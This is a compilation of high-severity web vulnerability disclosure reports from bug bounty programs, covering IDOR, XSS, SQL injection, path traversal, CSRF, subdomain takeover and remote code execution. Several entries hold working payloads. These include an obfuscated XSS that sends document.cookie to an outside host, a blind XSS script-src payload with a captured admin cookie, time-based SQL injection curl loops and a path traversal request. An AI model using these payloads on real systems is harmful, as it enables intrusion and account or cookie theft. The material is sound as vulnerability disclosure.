HIGH SEVERITY WEB APPLICATION VULNERABILITY REPORTS
==================================================

Report File: 1000922.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Authentication - Generic

Contents:

Hi,
I was looking at https://monitoring.prow-canary.k8s.io Grafana webapp. I'm not sure if it is for demo purposes, but I can access the main dashboard and view all graphs.
https://monitoring.prow-canary.k8s.io/dashboards
If indeed it is for demo purposes, please let me close the report myself.
looking forward to hearing from you
Thank you
Impact
access charts on various server resource usage.



==================================================

Report File: 1004745.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Insecure Direct Object Reference (IDOR)

Contents:

1- Navigate to the system. (https://███████/login.php)
2- Navigate to register page. (https://██████████/register.php)(i created user, username:██████ pass: TEst.123.!)
3- Login to the system. (https://███/login.php)
4- Navigate to "My Profile Page".
5- Intercept the request.
6- Change the "UID2=4820038" cookie value with "UID2=4820036".
7- Send the request to server.
8- View another user information.
Impact
I can view another user information.



==================================================

Report File: 1004750.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Insecure Direct Object Reference (IDOR)

Contents:

1- Open the burp suite.
2- Switch the "Repeater" tab.
3- Paste the content of the attached request into the repeater.
4- Replace the "UID2 = 4820041" value in the cookie with the ID value of the user to be attacked. Also write the user's email in the "userName" input.
5- Replace the victim user's password
Note: Follow the steps in the "1004745" report to get the user's email address.
Impact
You can change users' passwords and take over their account.



==================================================

Report File: 1004833.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - DOM

Contents:

Hello all
I found a DOM based XSS at iqcard.informatica.com
Description
After finding the path iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html. I noticed that the code inside attach.html was vulnerable to DOM XSS, due to the fact of the javascript document.location function. search. The code below illustrates the code contained in the attach.html file
Code 229 Bytes
1<HTML>
2<HEAD>
3<SCRIPT>
4function GetAttach()
5{
6	var strSearch = document.location.search
7	strSearch = strSearch.substring(1)
8	
9	document.location.replace(strSearch)
10}
11</SCRIPT>
12</HEAD>
13<BODY onload='GetAttach()'>
14
15
16</BODY>
17</HTML>
As can be seen through the code above, the variable strSearch receives everything that comes from the URL after the character? and then insert it into the function document.location.replace (). Through this scenario we have some possibilities.
1 - We can direct the user to any page we want for example:
Code 76 Bytes
1https://iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html?evil.com
2 - We can run a DOM Based XSS, running the javascript schema, javascript: alert (1);
Code 87 Bytes
1https://iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html?javascript:alert(1)
PoC
I uploaded a video and an image.
Impact
An attacker can redirect a user to a malicious page or execute XSS attacks against users of the application or use that domain as a phishing vector to attack other users of informatica.com



==================================================

Report File: 1004964.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

Hello DoD Team
Summary:
I have found out that all personal requests made to https://█████ form are being disclosed to the public at https://███████, which posses a critical privacy issue.
Description:
While searching my name at google "naglinagli" i have encountered a weird mention of my xss payload at the following endpoint https://██████████, which made realize that all the requests made at the contact form are open to the public
Step-by-step Reproduction Instructions
Navigate to https://███████
File a request.
█████████
Your request will publicly appear at https://█████
████

Suggested Mitigation/Remediation Actions
Making the access to the vulnerable endpoint to authorized personal only.
Best Regards,
nagli.
Impact
Personal reports made to █████ including PII of customers is being disclosed to the public through publicly accessible endpoint



==================================================

Report File: 1007799.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Path Traversal

Contents:

Summary:
When registering on https://████████ it is possible to use path traversal characters in a parameter allowing an attacker to read local files.
Description:
The registerUserInfoCommand.nextPageName parameter within the registration form is vulnerable to file path manipulation, where it is possible to submit a request containing path traversal characters (e.g. ../../../) followed by a local file, which will return the contents of the file. This can be used to read local files including sensitive configuration files such as /WEB-INF/web.xml, /WEB-INF/app-config.xml and /WEB-INF/spring/explicit-security-config.xml.
Impact
An attacker could read local files on the web server that they would normally not have access to, such as the application source code or configuration files containing sensitive information on how the website is configured.
Step-by-step Reproduction Instructions
Browse to https://██████/████████/register/RegisterUserInfo.htm
Setup an intercepting proxy (e.g. BurpSuite) and click Next, catching the request in Burp (don't worry about filling out the form fields)
For ease here I would recommend copying and pasting the below parameters into the request, replacing the parameters that were there originally. This request will fetch the /WEB-INF/web.xml configuration file, I have also attached two other requests which grab app-config.xml and explicity-security-config.xml. Once the parameters are there, forward the request to the server and you should see the web.xml file.
Code 392 Bytes
1registerUserInfoCommand.organization=Chantest+Corporation&registerUserInfoCommand.organizationId=49800&registerUserInfoCommand.currPageName=SearchUserOrgInfo.jsp&registerUserInfoCommand.nextPageName=..%2f..%2f..%2fWEB-INF%2fweb.xml&registerUserInfoCommand.prevPageName=jsp%2FRegistration%2FRegisterAccountInfo.jsp&registerUserInfoCommand.submitButton=Choose+This+Organization+and+Continue+%3E
Product, Version, and Configuration (If applicable)
N/A
Suggested Mitigation/Remediation Actions
Rather than placing the filename of the next page directly in a parameter, it would be better to maintain a whitelist of acceptable filenames and use a unique corresponding identifier to access the file. Then any request containing an invalid identifier can just be rejected. Additionally, you could also sanitise any path traversal characters that may be present in a request.
Impact
An attacker could read local files on the web server that they would normally not have access to, such as the application source code or configuration files containing sensitive information on how the website is configured.



==================================================

Report File: 1007988.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

Summary:
I reported the vulnerability to Facebook, and they have said to report it here for the bounty.
Platform(s) Affected:
https://en.instagram-brand.com/requests/dashboard
## Steps To Reproduce:
Create two account User A, User B at https://en.instagram-brand.com/
Apply for Instagram brand from https://en.instagram-brand.com/requests/dashboard by User A
Login to user B and intercept the request
4.Send a post request with cookie and other header got by intercepting user B in the below endpoint and replace comment 44799 with User A support ticket id
POST /wp-json/brc/v1/approval-requests/44799/comments HTTP/1.1
text=sure thanks&files=1597287925578-44741-%3Etest.jpg&sizes=4249
Supporting Material/References:
video POC - https://drive.google.com/file/d/1My6MQuQTmYwCWQw_7uw1veGFkn13WkDP/view?usp=sharing
screenshot of viewing other's messages - https://drive.google.com/file/d/1WnDGPDHGA6pP9RIPBQpEAIXxPTaFJZVX/view?usp=sharing&fbclid=IwAR3k4cEfCcUcfBKhlffQgjDcy4ASRf7V3fsS7FmZcHyyd_HZZfFk1OlDpf8
Impact
1) can comment in other's support ticket
2) can view other's support ticket comments (Both Instagram as well as user's)



==================================================

Report File: 1010132.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - DOM

Contents:

Summary:
Hello Team,
While testing it was observed that on https://app.hey.com/, on Search box there is a possibility of XSS. Although the payload is reflected in the DOM but the CSP blocks the execution of the script, the XSS can happen if the CSP is somehow bypassed. The Subject parameter is vulnerable.
Apart from XSS, the HTML injection attack is working pretty straight forward.
Steps To Reproduce:
Go to https://app.hey.com
Login to your account.
Click on 'Write' Mail button.
Add the recipient as yourself.
In the Subject, add following payload
Code 76 Bytes
1TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
Send the mail.
Go to top left corner Search Box and type "TestPayload"
You will see the mail you sent to yourself, and <a> tag will be there "ClickHere".
Click on it, you will see the CSP violation in the Console.
Below is the CSP of the page:
Code 368 Bytes
1script-src 'self' https://production.haystack-assets.com stats.hey.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com; 
2object-src 'none'; 
3base-uri 'none'; 
4form-action 'self'; 
5frame-ancestors 'none'; 
6report-uri https://sentry.io/api/1371426/security/?sentry_key=3a5ea420eecc45bd9e1d1c2424683f3a&sentry_environment=production&sentry_release=
As seen from the CSP, there might be a possibility of Host whitelists bypass.
Impact
If attacker send such type of mail to a victim and if victim accidentally searches for the same mail then the Script will be executed leading to account takeover. This is possible only if CSP is bypassed.



==================================================

Report File: 1010466.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Stored

Contents:

Summary:
The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request.
Steps To Reproduce:
XSS
use a proxy like burp suite and turn intercept on
upload a file to the support chat
change the filename to \"><img src=1 onerror=\"url=String104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp'GET',url,true;xhttp'send';
open the chat support and xss will activate
CSRF
create a file html in some server
create a form with a file and the payload name
send to a new tab. This one will post the image with payload
Supporting Material/References:
https://onlinestringtools.com/convert-string-to-ascii to convert the attacker's website link to ascii
Impact
Allows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.
For the guys of support chat, they don't even need to click in the link for the XSS activate.



==================================================

Report File: 1011888.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Stored

Contents:

Summary
Because the HTML is not sanitized when taking the input on https://accounts.informatica.com/registration.html, the input is vulnerable to XSS. When a payload such as
"><script src=https://monty.xss.ht></script>
is put into the form under company it triggers a blind xss. When the payload successfully is loaded, it dumps information as a POC.
Steps to reproduce
1) Goto https://accounts.informatica.com/registration.html and create a temporary account
2) Enter a blind xss payload into the Company field
3) Wait until an admin opens the user record
4) Then, the report should be generated ( I used https://xsshunter.com/)
Supporting Materials
As mentioned, the blind XSS gave me the following IP address who loaded the admin panel:
████████
The URL of where the payload fired:
https://█████████/phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit&TargetUser=480514&FromSearch=True#loaded
This cookie:
Code 1.32 KiB
1wm-cseu-id=%22acd409d8-0f55-4dfd-ac79-d604c5af274e%22; _ga=GA1.2.1915629716.1598908964; wm-fgug=true; wm-ueug=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-nor=true; _gid=GA1.2.244633304.1603115085; wm-ueuT=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-hb={%22sendBaseTime%22:1603115100166}; wm-wmv=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-ds-lfb=%22{}%22; wm-ssn=%22758bcf15-12bc-497e-ab66-f82c25747f45%22; wm-ssn-ct=1603118590494; wm-po-q=null; wm-prsst={%22tId%22:-1%2C%22stt%22:0%2C%22step%22:-1%2C%22spn%22:0%2C%22plgd%22:%22%22%2C%22pint%22:null%2C%22splt%22:[]%2C%22sph%22:[]%2C%22igd%22:null}; wm-ds-lbp=%22[]%22; wm-ds-b=%22[]%22; wm-ds-hb=%22[]%22; wm-ds-lbb=%22{}%22; wm-smtp-init={%22type%22:6}; wm-ds-s=%22[]%22; shoppingcart_coupons=%5B%5D; multiVPoll=; c-s=expires=1603207989~access=/clientimg/informatica/*!/content/informatica/*~md5=832a84c8a012e7d42c375195181dde62; amplitude_id_a328ec1895b18ee52643ef53449b6ecbcsod.com=eyJkZXZpY2VJZCI6IjgwYTA3ZDIxLTA3ZDctNDc4Mi1iNzIxLTc2NTkzMDJkYzg3OFIiLCJ1c2VySWQiOiJENDA4OTY2NUE4OTc5REMyQjUyNDhGMkM1NTk2Q0E1MjdEMzVGQUJFMzA2MTc5REQ0NjA5NEUyQUU1QUJCQUMxIiwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNjAzMTIxMTg3NTM0LCJsYXN0RXZlbnRUaW1lIjoxNjAzMTIxNTkyODA3LCJldmVudElkIjoyMjIsImlkZW50aWZ5SWQiOjIxOSwic2VxdWVuY2VOdW1iZXIiOjQ0MX0=; wm-po-p=13; wm-po-r=13; wm-dmn=csod.com; _gat=1; wm-ds-lb=%22{}%22
What the XSS saw:
█████
Note that this is leaking what appears to be another customer's data
The full report:
████████
Impact
With this blind XSS vulnerability, a malicious actor could download malware, install a keylogger, steal the admin cookie, and learn IPs of the backend servers and softwares. Also as shown by the screenshot it leaks singular user's names and their corresponding email addresses.



==================================================

Report File: 1015406.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- SQL Injection

Contents:

Description:
SQL Injection is a vulnerability which allows interference with the queries performed on a database, to obtain sensitive information which could be really useful to attackers. A web application database is often queried using user-requests parameters, which when are not properly sanitized can be modified injecting malicious code. In this case, the vulnerable endpoint is http://www.████████ and the vulnerable parameter is the POST rnum parameter. Respecting the program guidelines, I performed the minimal amount of testing required to prove that a vulnerability existed, but please tell me if I can bring the exploitation further to give more information.
Reproduction steps
1 -Repeat the below requests with a interceptor proxy (for example, using Burp).
Code 609 Bytes
1POST ████ HTTP/1.1
2Host: www.████
3Content-Length: 72
4Cache-Control: max-age=0
5Upgrade-Insecure-Requests: 1
6Origin: http://www.███████
7Content-Type: application/x-www-form-urlencoded
8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
10Referer: http://www.███████████
11Accept-Encoding: gzip, deflate
12Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7
13Cookie: PHPSESSID=█████
14Connection: close
15
16███████
Code 618 Bytes
1POST ██████████ HTTP/1.1
2Host: www.███████
3Content-Length: 72
4Cache-Control: max-age=0
5Upgrade-Insecure-Requests: 1
6Origin: http://www.█████
7Content-Type: application/x-www-form-urlencoded
8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
10Referer: http://www.████████████████
11Accept-Encoding: gzip, deflate
12Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7
13Cookie: PHPSESSID=████
14Connection: close
15
16█████
In the first case, the record obtained from the database is the following:
Code 6 Bytes
1██████
██████
Whilst in the second case, the record obtained is:
Code 3 Bytes
1███
█████
This confirms that the OFFSET clause is concatenated to the original query and there is the possibility to exploit a SQL Injection.
Impact
The vulnerability could allow an attacker to dump sensitive and personal data from the web application database (such as usernames and password hashes) or to perform authentication bypasses.



==================================================

Report File: 1016966.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Code Injection

Contents:

The Windows application for Basecamp, allows a "Download" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.
I was able to craft a link, which when clicked by a user, will be downloaded and executed!
To get file execution on the user, we bypass the restrictions first:
There is a regular expression which checks for "internal domains", which can easily be bypassed by controlling the subdomain. The host pattern is /(launchpad\.37signals\.com|launchpad\.(?:dev|test))/ and /(3\.(?:staging\.)?basecamp\.com|bc3\.(?:dev|test))/. By controlling the subdomain, and setting it to something like launchpad.dev.mydomain.com, we can bypass this regular expression verification.
Since we'll be sending the request to our own server, we simply need to return text/calendar as the content-type header. This can be seen in the Electron code in OPENABLE_MIME_TYPES = new Set(["text/calendar"]);
And then when adding the URL to your post, simply add the ?attachment=true to the URL.
To reproduce, simply register any subdomain that starts with launchpad.dev. (mine is launchpad.dev.████).
An HTTP server with the needed mimetype header, can be setup with Flask easily with this code:
Code 267 Bytes
1from flask import Flask, send_from_directory
2app = Flask(__name__)
3@app.route('/<path:path>')
4def hello(path):
5    return send_from_directory(".", "file.exe", as_attachment=True, mimetype="text/calendar")
6if __name__ == '__main__':
7    app.run(port=80,host="0.0.0.0")
Then add the link to your post with the appropriate attachment parameter, as such:
http://launchpad.dev.█████████/file.exe?attachment=true
Impact
Remote code execution on any user which clicks a link on your crafted post through the desktop app.



==================================================

Report File: 1017189.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Stored

Contents:

Description:
When you submit a request at https://██████████, the content is being sent to the administrators of the application, and you will be presented with your request status at https://████
The Description field at the request status page is prone to stored xss and blind stored XSS injection, because there is no sanitization on the input being inserted.
As for now this is self (because the link is for the account), i'm 100% sure that when an administrator will check the request his details will get sent to my email, and i have a xss payload stored on my user.
████████
Step-by-step Reproduction Instructions
Register to https://██████████ / login to my account (████)
Navigate to https://███
Craft your XSS payload on the description window
Submit your request
Navigate to https://█████████
The javascript will execute.
Suggested Mitigation/Remediation Actions
Sanitizing the input being inserted into the description window field.
Best regards
nagli
Impact
Stored blind XSS on the pac.whs.mil website which could lead to administrator credentials being leaked.



==================================================

Report File: 1018037.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Uncontrolled Resource Consumption

Contents:

Summary :
after trying to change my initial name to something long i found out that their are no limits to how long it can be , so i directly changed it to something very long name.txt (F1050497) which caused my account to really slow down when accessing it and in the android app , it just keeps crashing whenever i open it ( no way to access my account at all ) + if i make it longer i get a 500 Internal Server Error response which highly suggests that this can cause a server side denial of service .
Description:
due to not checking the length of the name one can change it to a very long one causing both a server side denial of service and a client side one
server side :
one can send multiple requests to change the name of the account and each of them containing a very long name which will cause a 500 internal server error leading to an extensive Resource Consumption.
client side :
if one is able to change the name another account he will also have the ability to crash his android app therefore preventing him from accessing his account.
if one with a long name sends a message to any email he will slowwwwww down everything where the message appears including folders (inbox , trash ..) and prevent him from accessing his contacts where the email's name also appears , because the app will hang on a loading screen for about 40min each time , and this can be more if for example he sends multiple messages or use multiple accounts ( each on with a long name ) to send a message to the victim mail.
Proof of Concept:
open https://app.hey.com/contacts/%user_id_number%/user/editand change the name to the one attached name.txt (F1050497) and submit.
now u can't open the android app and u can slow down anyone's account just by sending them a message (or multiple ones).
Impact
Attacker can perform a DoS Attack against the server
slow down anyone's account
crash the android app



==================================================

Report File: 1018270.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-Site Request Forgery (CSRF)

Contents:

Hi DoD team,
I found a CSRF to account takeover in https://███████/
NOTE:
Try to open the site in firefox because chrome sometimes is not allowing to open the site.
Summary:
There is no protection against CSRF in changing email which lead to CSRF to account takeover on https://██████/.
Step-by-step Reproduction Instructions
I have made a video POC in which I have shown the account takeover clearly Please do watch for better understanding
Login as victim and check your infos in the account details
Open the CSRF malicious file which I have attached (csrf_POC.html)
Now the email is different (you can also change your name and other fields as well)
Now you can simply takeover the account
All you have to do is click on reset password on main page and enter the email you used to trick the victim and you will get instructions to reset the password. And you can successfully takeover the account
Suggested Mitigation/Remediation Actions
Use captchas and CSRF-tokens for be sure that the victim is changing the datas knowing that.
Impact
It is a critical issue as i was able to takeover anyone account using this attack. This vulnerability is high/critical because I was able to perform account takeover



==================================================

Report File: 1018413.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cleartext Storage of Sensitive Information

Contents:

Issue Description
When I browsed through all the JS files on prow.k8s.io I came across a link called /config which contains a configuration disclosure for the development files
URL Vulnerabilities
https://prow.k8s.io/config
Proof On Concept
Code 1.19 KiB
1- continuous-integration/travis-ci
2kubespray:
3required_status_checks:
4contexts:
5- Kubespray CI Pipeline
6required_status_checks:
7contexts:
8- cla/linuxfoundation
9
10- kubernetes-security
11  rerun_auth_configs:
12    '*':
13      github_team_ids:
14      - 2009231
15      - 2460384
16  spyglass:
17    gcs_browser_prefix: https://gcsweb.k8s.io/gcs/
18    gcs_browser_prefixes:
19      '*': https://gcsweb.k8s.io/gcs/
20    lenses:
21    - lens:
22        name: metadata
23      optional_files:
24      - ^(?:podinfo|prowjob)\.json$
25      remote_config:
26        endpoint: http://127.0.0.1:1234/dynamic/metadata
27        hide_title: true
28        priority: 0
29        static_root: ""
30        title: Metadata
31      required_files:
32      - ^(?:started|finished)\.json$
33    - lens:
34        config:
35          highlight_regexes:
36          - timed out
37          - 'ERROR:'
38          - (FAIL|Failure \[)\b
39          - panic\b
40          - ^E\d{4} \d\d:\d\d:\d\d\.\d\d\d]
41          - '^INFO: Analyzed \d+ targets'
42        name: buildlog
43      remote_config:
44        endpoint: http://127.0.0.1:1234/dynamic/buildlog
45        hide_title: false
46        priority: 10
47        static_root: ""
48        title: Build Log
49      required_files:
50      - ^.*build-log\.txt$
Impact
Information Exposed + File Configuration Disclosure



==================================================

Report File: 1018621.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- SQL Injection

Contents:

Summary:
SQL Injections on Referer Header exploitable via Time-Based method
Description:
https://owasp.org/www-community/attacks/SQL_Injection
## Impact
https://owasp.org/www-community/attacks/SQL_Injection
## Step-by-step Reproduction Instructions
First, vulnerable points:
https://███████/███████/library.php?alert=
https://██████████/████████/Chart01.php?alert=
https://████████/████/Chart02.php?alert=
https://██████████/█████████/Chart03.php?alert=
https://████/█████Prod.php?alert=
https://██████████/█████systems.php?alert=
https://█████████/██████████db.php?alert=
(Don't miss the alert GET parameter...)
Okay, let's check the SQLi... lets use time and curl with a true condition (1=1), if 1=1, then, the server sleep 20 seconds else nothing (I just wrote false to make it explicit for you):
time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'" --url "https://████████/█████/Chart01.php?alert="
Okay..then.. let's check the response:
Code 794 Bytes
1real	0m21,447s
2user	0m0,029s
3sys	0m0,000s```
4
5The time is 21 seconds.. then.. let's update the if condition as false (1=2)
6
7```time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'" --url "https://████████/████████/Chart01.php?alert=" ```
8
9Response:
10
11```Thank you - you may close this window
12real	0m1,806s
13user	0m0,016s
14sys	0m0,008s```
15
16Hmm.. approx 2 seconds.. we have proof that's vuln.. let's try more..
17I want the first character of the current database name..
18let's go for it!:
19
20```for i in {{a..z},{1..9}}; do echo "Testing $i char:"; time curl -s -H "Referer: '+(select*from(select(if(substring(database(),1,1)='$i',sleep(20),false)))a)+'" --url "https://████/██████/Chart01.php?alert="; done```
21
22And there are only one-second answers from time except for the m!
23
Testing l char:
Thank you - you may close this window
real 0m1,321s
user 0m0,028s
sys 0m0,000s
Testing m char:
Thank you - you may close this window
real 0m21,299s
user 0m0,019s
sys 0m0,010s
Testing n char:
Thank you - you may close this window
real 0m1,331s
user 0m0,016s
sys 0m0,012s
Code 215 Bytes
1
2Thanks for reading!
3
4There is one of these injection points that is supposedly fixed at report #995122 (report disclosed, resolved.. but it's not..)
5
6## Impact
7
8https://owasp.org/www-community/attacks/SQL_Injection



==================================================

Report File: 1018790.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Privilege Escalation

Contents:

Summary:
The Subdomains https://register.acronis.com, https://promo.acronis.com, https://info.acronis.com and https://promosandbox.acronis.com
are vulnerable to takeover due to unclaimed marketo CNAME records. Anyone is able to own these subdomains at the moment.
This vulnerability is called subdomain takeover. You can read more about it here:
https://blog.sweepatic.com/subdomain-takeover-principles/
https://hackerone.com/reports/32825
https://hackerone.com/reports/779442
https://hackerone.com/reports/175070
Steps To Reproduce:
Code 518 Bytes
1nslookup register.acronis.com
2Non-authoritative answer:
3Name: sjh.mktossl.com
4Addresses:104.17.74.206
5          104.17.72.206
6          104.17.70.206
7          104.17.73.206
8          104.17.71.206
9Aliases:  register.acronis.com
10          acronis.mktoweb.com
11
12nslookup promo.acronis.com
13Non-authoritative answer:
14Name:    sjh.mktossl.com
15Addresses:  104.17.71.206
16          104.17.70.206
17          104.17.74.206
18          104.17.72.206
19          104.17.73.206
20Aliases:  promo.acronis.com
21          acronis.mktoweb.com
22
CNAMES entries to corresponding domains are as:
Code 269 Bytes
1promo.acronis.com                               acronis.mktoweb.com
2promosandbox.acronis.com                   acronissandbox2.mktoweb.com
3register.acronis.com                            acronis.mktoweb.com
4info.acronis.com  	                             mkto-h0084.com
As register.acronis.com and promo.acronis.com pointing to CNAME record as acronis.mktoweb.com and are aliases to acronis.mktoweb.com . http://acronis.mktoweb.com/ is giving 404, page not found with message "The requested URL was not found on this server" which can be claimed by anyone now and would result in subdomain takeover.
The marketo document to Customize Your Landing Page URLs with a CNAME
https://docs.marketo.com/display/public/DOCS/Customize+Your+Landing+Page+URLs+with+a+CNAME
As marketo is a paid service and offers account for marketing automation, I don't have a registered account.
I wrote to Marketo technical support team and they claim the availability of listed domains as the listed domains are not in use or configured anymore.
Supporting Material/References:
Please refer to attached screenshots.
Impact
With this, I can clearly see XSS impact in your case. Please have a look at your /v2/account request intercepted below:
Request:
Code 1.62 KiB
1PUT /v2/account HTTP/1.1
2Host: account.acronis.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/json;charset=utf-8
8Content-Length: 702
9Origin: https://register.acronis.com
10Connection: close
11Referer: https://account.acronis.com/
12Cookie: _gcl_au=1.1.36144172.1601449011; _ga=GA1.2.1290766356.1601449012; _fbp=fb.1.1601449012432.633797135; _hjid=a7dd36be-ea53-40b1-b04e-c2a96f5ebc3c; optimizelyEndUserId=oeu1601449014822r0.42778295429069313; OptanonConsent=isIABGlobal=false&datestamp=Mon+Oct+26+2020+16%3A35%3A28+GMT%2B0530+(India+Standard+Time)&version=6.6.0&hosts=&consentId=07081eac-3ae3-443d-8451-79f5327d9351&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0004%3A1%2CC0003%3A1%2CC0002%3A1&AwaitingReconsent=false&geolocation=IN%3BHR; _mkto_trk=id:929-HVV-335&token:_mch-acronis.com-1601449020651-40834; OptanonAlertBoxClosed=2020-10-26T11:05:28.204Z; visid_incap_1638029=Bol4fqOiQTKxMXB55rfSHvSPlF8AAAAAQUIPAAAAAACe+MbhqMW1sJI4dpZBH6DI; _hjTLDTest=1; nlbi_1638029=ibxAVmtdEHzy/Y9u+BxnEAAAAAB308NLs7A3ARoQwyk4Cyrg; incap_ses_745_1638029=ddKxJtFthhy2IeNut8VWCvWPlF8AAAAACuwA/vpt+9dXQmj6hoxBWQ==; _gid=GA1.2.639811834.1603690260; _gac_UA-149943-47=1.1603691724.Cj0KCQjwxNT8BRD9ARIsAJ8S5xZC0_Hlxu0wgG7xA0-jU5eIi2BxoGFsRealW_kNcbHRyB_H8h3z-y0aAjFAEALw_wcB; AcronisSID.en=8a4d91ace2ecadca23dda91cdcb5abc5; AcronisUID.en=1438137573; _hjAbsoluteSessionInProgress=1; _uetsid=6d516b50174c11eb8ef2b18637bee740; _uetvid=b490e7509541648c67826dc18a0c7c46; _gat_UA-149943-47=1
Response:
Code 866 Bytes
1HTTP/1.1 200 OK
2Server: nginx
3Date: Mon, 26 Oct 2020 11:59:18 GMT
4Content-Type: application/json
5Connection: close
6Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
7pragma: no-cache
8expires: -1
9X-RateLimit-Limit: 100
10X-RateLimit-Remaining: 97
11Access-Control-Allow-Origin: https://register.acronis.com
12Access-Control-Allow-Credentials: true
13Access-Control-Allow-Headers: Accept, Accept-Encoding, Accept-Language, Authorization, Cache-Control, Connection, DNT, Keep-Alive, If-Modified-Since, Origin, Save-Data, User-Agent, X-Requested-With, Content-Type
14Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
15p3p: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT
16X-Frame-Options: SAMEORIGIN
17Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
18X-XSS-Protection: 1; mode=block
19Content-Length: 714
See in response below,:
Code 96 Bytes
1Access-Control-Allow-Origin: https://register.acronis.com
2Access-Control-Allow-Credentials: true
Access-Control-Allow-Credentials are true for Access-Control-Allow-Origin as *.acronis.com which makes Credentials true for all subdomains of acronis.com. Cross-Origin Resource Sharing (CORS) allows cross-domain access from all subdomains of acronis.com
Therefore, by taking over listed subdomains or finding any XSS vulnerability in any of the listed subdomains can steal user information or read arbitrary data from the accounts of other users.
The Subdomain takeover allows various attacks.
Malware distribution
Phishing / Spear phishing
XSS
Authentication bypass
...
List goes on and on. Since some certificate authorities (Let's Encrypt) require only domain verification, SSL certificate can be easily generated.
An attacker can utilize these domains for targeting the organization by fake login forms, or steal sensitive information of teams (credentials, information, etc)
FIX & MITIGATION
You should immediately remove the CNAME entries for these domains or point it elsewhere if you don't use marketo services.
Please let me know if more info needed or any help.
Best Regards,
Ashmek



==================================================

Report File: 1024984.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- SQL Injection

Contents:

Step-by-step Reproduction Instructions
copy the request to your burp suite :
Code 303 Bytes
1GET /█████████/library.php?c=G14'XOR(if(now()=sysdate(),sleep(1*1),0))OR' HTTP/1.1
2Host: ██████
3Accept-Encoding: gzip, deflate
4Accept: */*
5Accept-Language: en
6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
7Connection: close
Code 67 Bytes
1payload > 'XOR(if(now()=sysdate(),sleep(1*1),0))OR'    2,077 millis
██████████
Code 67 Bytes
1paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     4,599 millis
████████
Code 67 Bytes
1paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     9,989 millis
███
This issue is same to #995122
Impact
SQL Injection



==================================================

Report File: 1026265.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Path Traversal

Contents:

Summary:
